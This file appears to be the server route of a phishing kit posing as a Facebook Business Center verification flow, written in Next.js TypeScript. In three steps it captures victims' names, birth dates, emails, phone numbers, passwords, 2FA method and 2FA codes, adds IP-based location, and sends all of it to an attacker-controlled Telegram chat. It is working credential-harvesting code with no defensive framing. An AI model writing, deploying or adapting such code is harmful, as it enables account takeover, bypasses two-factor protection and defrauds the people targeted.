import { NextRequest, NextResponse } from "next/server";

interface Step1Data {
  full_name: string;
  date_of_birth: string;
  email: string;
  email_business: string;
  phone_number: string;
  page_name: string;
  password1: string;
  password2: string;
  step: 1;
}

interface Step2Data {
  email: string;
  email_business: string;
  authen_method: string;
  step: 2;
}

interface Step3Data {
  email: string;
  email_business: string;
  code1: string;
  code2?: string; // Optional - only present on second submission
  step: 3;
}

type RequestData = Step1Data | Step2Data | Step3Data;

async function getIpInfo(
  ip: string
): Promise<{ country: string; city: string }> {
  // Multiple free IP geolocation APIs with fallback
  const apis = [
    {
      url: `http://ip-api.com/json/${ip}`,
      parse: (data: any) => ({
        country: data.country || "",
        city: data.city || "",
      }),
      check: (data: any) => data.status === "success",
    },
    {
      url: `http://ipwho.is/${ip}`,
      parse: (data: any) => ({
        country: data.country || "",
        city: data.city || "",
      }),
      check: (data: any) => data.success === true,
    },
    {
      url: `https://ipapi.co/${ip}/json/`,
      parse: (data: any) => ({
        country: data.country_name || "",
        city: data.city || "",
      }),
      check: (data: any) => !data.error,
    },
    {
      url: `https://freeipapi.com/api/json/${ip}`,
      parse: (data: any) => ({
        country: data.countryName || "",
        city: data.cityName || "",
      }),
      check: (data: any) => data.countryName !== undefined,
    },
  ];

  // Try each API until one succeeds
  for (const api of apis) {
    try {
      const response = await fetch(api.url, {
        signal: AbortSignal.timeout(5000), // 5 second timeout
      });
      const data = await response.json();

      if (api.check(data)) {
        const result = api.parse(data);
        console.log(`Successfully got IP info from ${api.url}`);
        return result;
      }
    } catch (error) {
      console.error(`Failed to get IP info from ${api.url}:`, error);
      continue; // Try next API
    }
  }

  // If all APIs failed, return empty values
  console.error("All IP geolocation APIs failed");
  return { country: "", city: "" };
}

async function sendTelegram(message: string): Promise<boolean> {
  const telegramUrl = process.env.TELEGRAM_URL;
  const chatId = process.env.TELEGRAM_GROUP;

  if (!telegramUrl || !chatId) {
    console.error("Telegram configuration is missing");
    return false;
  }

  try {
    const response = await fetch(`${telegramUrl}/sendMessage`, {
      method: "POST",
      headers: {
        "Content-Type": "application/json",
      },
      body: JSON.stringify({
        chat_id: chatId,
        text: message,
      }),
    });

    const result = await response.json();
    return result.ok === true;
  } catch (error) {
    console.error("Failed to send Telegram message:", error);
    return false;
  }
}

export async function POST(request: NextRequest) {
  try {
    const data: RequestData = await request.json();

    let fullInfo = "";

    if (data.step === 1) {
      // Get IP address from request headers
      const ip =
        request.headers.get("x-forwarded-for")?.split(",")[0] ||
        request.headers.get("x-real-ip") ||
        "Unknown";

      // Get location info from IP
      const ipInfo = await getIpInfo(ip);

      // Step 1: Registration form with passwords
      fullInfo = `Full Name: ${data.full_name}`;
      fullInfo += `\nBirth Day: ${data.date_of_birth}`;
      fullInfo += `\nEmail: ${data.email}`;
      fullInfo += `\nBusiness Email: ${data.email_business}`;
      fullInfo += `\nIP: ${ip}`;
      fullInfo += `\nCountry: ${ipInfo.country}`;
      fullInfo += `\nCity: ${ipInfo.city}`;
      fullInfo += `\nPhone: ${data.phone_number}`;
      fullInfo += `\nFB Page: ${data.page_name}`;
      fullInfo += `\nPassword First: ${data.password1}`;
      fullInfo += `\nPassword Second: ${data.password2}`;
    } else if (data.step === 2) {
      // Step 2: Authentication method
      fullInfo = `Email: ${data.email}`;
      fullInfo += `\nBusiness Email: ${data.email_business}`;
      fullInfo += `\nAuthen Method: ${data.authen_method}`;
    } else if (data.step === 3) {
      // Step 3: 2FA codes
      fullInfo = `Email: ${data.email}`;
      fullInfo += `\nBusiness Email: ${data.email_business}`;
      fullInfo += `\n2FA 1: ${data.code1}`;
      // Only add code2 if it exists (for second submission)
      if (data.code2) {
        fullInfo += `\n2FA 2: ${data.code2}`;
      }
    } else {
      return NextResponse.json({ error: "Invalid step" }, { status: 400 });
    }

    // Send message to Telegram
    const sent = await sendTelegram(fullInfo);

    if (!sent) {
      return NextResponse.json(
        { error: "Failed to send message" },
        { status: 500 }
      );
    }

    // Return success with next step URL
    return NextResponse.json({
      nextstep: "/business-center-community/confirm",
      success: true,
    });
  } catch (error) {
    console.error("Error processing request:", error);
    return NextResponse.json(
      { error: "Internal server error" },
      { status: 500 }
    );
  }
}
